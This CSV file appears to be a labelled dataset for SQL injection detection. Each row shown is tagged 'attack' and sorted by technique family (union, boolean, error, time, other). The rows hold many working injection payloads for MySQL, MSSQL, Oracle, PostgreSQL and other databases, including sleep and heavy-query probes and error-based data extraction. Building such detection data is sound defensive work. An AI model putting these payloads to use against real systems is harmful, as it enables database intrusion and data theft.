label,payload,family
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",boolean
attack,"1',  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",other
attack,"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",error
attack,"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'swfj' like 'swfj",boolean
attack,1'  )   where 5307  =  5307,other
attack,-1470'   )    )     )   or 9323  =  9323#,boolean
attack,"1'   )    )    as mjps where 2179  =  2179 union all select null,null,null,null,null,null,null--",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,boolean
attack,1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',boolean
attack,1'+  (  select 'lcru' where 3215  =  3215,other
attack,"1""  )   as ktnq where 9005  =  9005",other
attack,"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",error
attack,-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,boolean
attack,1'  )   as uaoz where 2464  =  2464,other
attack,"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"1   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   9313  =  9313",boolean
attack,"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",boolean
attack,1' where 5335  =  5335,other
attack,"1%""   )    )     )   union all select null,null,null,null,null--",union
attack,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",boolean
attack,"-9265""  )   or 7834  =  1685",boolean
attack,waitfor delay '0:0:5'# ogzq,time
attack,"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",time
attack,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",union
attack,select case when 5308  =  6745 then 1 else null end--,other
attack,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",union
attack,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",boolean
attack,"1%'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",boolean
attack,"1%""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,boolean
attack,select case when 9848  =  2618 then 1 else null end--,other
attack,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",error
attack,1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802",boolean
attack,-2316'   )    )     )   or 8519  =  6010,boolean
attack,1 where 7442  =  7442,other
attack,1  )   and sleep  (  5  )  #,time
attack,1 where 7516  =  7516 union all select null#,union
attack,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",union
attack,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,boolean
attack,"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",union
attack,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,error
attack,"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,other
attack,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'qgrt'  =  'qgrt",boolean
attack,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,time
attack,1'||  (  select 'dezl' where 8661  =  8661,other
attack,"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'uvlu'  =  'uvlu",boolean
attack,1' where 2145  =  2145,other
attack,"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""kins""  =  ""kins",boolean
attack,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",error
attack,"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",union
attack, (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,other
attack,-6377' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'qcms' like 'qcms,boolean
attack,end,other
attack,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",union
attack,1%'   )    )     )   union all select null--,union
attack,1   )    )    order by 1--,other
attack,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,boolean
attack,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",error
attack,"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",union
attack,"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",error
attack,-6015%'  )   order by 1--,other
attack,1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'diyb' like 'diyb,boolean
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",error
attack,"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",union
attack,-1549'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'fnwx'  =  'fnwx,error
attack,"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,boolean
attack,1  )   where 9344  =  9344,other
attack,1'  )   where 8163  =  8163,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",boolean
attack,select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,other
attack,"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv",boolean
attack,"1'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",boolean
attack,"1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null--",union
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",boolean
attack,"1""  )   where 4951  =  4951",other
attack,"1'   )    )    as kxek where 3429  =  3429 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,-3666'  )   where 6386  =  6386 union all select 6386--,union
attack,1%' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',error
attack,1' where 6135  =  6135,other
attack,1%'   )    )    order by 1#,other
attack,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",boolean
attack,"1"" where 2547  =  2547 or sleep  (  5  )  #",time
attack,"-5959"" or 2477  =  1144",boolean
attack,1  )   as iqkf where 7780  =  7780,other
attack,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",union
attack,"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",boolean
attack,"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",union
attack,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",boolean
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",time
attack,"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1  )   as tkkn where 7832  =  7832   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",union
attack,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,1'   )    )    as dago where 9788  =  9788,other
attack,"1%""  )   and 9198  =  9198--",boolean
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",boolean
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",boolean
attack,"1%' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""ymhg""  =  ""ymhg",error
attack,"-9557%""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,boolean
attack,"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""cmhh"" like ""cmhh",error
attack,select sleep  (  5  )   and   (  1435  =  1435,time
attack,"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",boolean
attack,"-4866""  )   as eyrq where 8365  =  8365 or 1898  =  8320#",boolean
attack,"1%""  )   waitfor delay '0:0:5'--",time
attack,"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",boolean
attack,-8264%'  )   order by 1#,other
attack,if  (  6647  =  2179  )   select 6647 else drop function zvlq--,other
attack,1'+  (  select 'ezpy' where 5282  =  5282 order by 1#,other
attack,"-6770"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",error
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  '",boolean
attack,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,select 'qqpjq'||  (  case 5118 when 5118 then 1 else 0 end  )  ||'qzvzq' from rdb$database,other
attack,"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",boolean
attack,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",error
attack,select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,other
attack,"1"" where 7599  =  7599",other
attack,"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq",boolean
attack,1%'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  '%'  =  ',boolean
attack,1'||  (  select 'yzdz' where 5021  =  5021,other
attack,-4617'   )    )     )   or 9323  =  9323#,boolean
attack,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",time
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",time
attack,"1,iif  (  7475  =  7475,1,1/0  )  ",other
attack,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",union
attack,1  )   as pyjx where 9005  =  9005,other
attack,"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",union
attack,"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""uvvy"" like ""uvvy",boolean
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",union
attack,"1%'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",error
attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1"" and 9468  =  7105--",boolean
attack,"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",boolean
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'jutx'  =  'jutx",boolean
attack,"1' in boolean mode  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,boolean
attack,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",union
attack,"1  )   union all select null,null,null--",union
attack,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,boolean
attack,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,"1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #",error
attack,"1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",error
attack,1 where 1576  =  1576,other
attack,"1""   )    )     )   and 9198  =  9198--",boolean
attack,"1""   )    )    as tngu where 3644  =  3644 union all select null--",union
attack,1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',time
attack,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",union
attack,"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",union
attack,-1641'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'vgcb' like 'vgcb,error
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",boolean
attack,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc",error
attack,"1""   )    )    as vbdo where 3882  =  3882",other
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,-7164%' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',boolean
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,time
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",union
attack,"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",boolean
attack,"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",union
attack,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",boolean
attack,"1'+  (  select 'qpxk' where 7139  =  7139 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",error
attack,"-8538"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",boolean
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",time
attack,"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",union
attack,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,select   (  case when   (  7990  =  7627  )   then 7990 else 1/  (  select 0  )   end  )  --,other
attack,"-1766""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""ydzq"" like ""ydzq",boolean
attack,"1%""   )    )    and 1083  =  6202",boolean
attack,"-5731"" union all select 3083,3083,3083#",union
attack,"1' in boolean mode  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  #",other
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean
attack,1' where 9816  =  9816 and 7533  =  7533--,boolean
attack,"1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,1'  )   and sleep  (  5  )  #,time
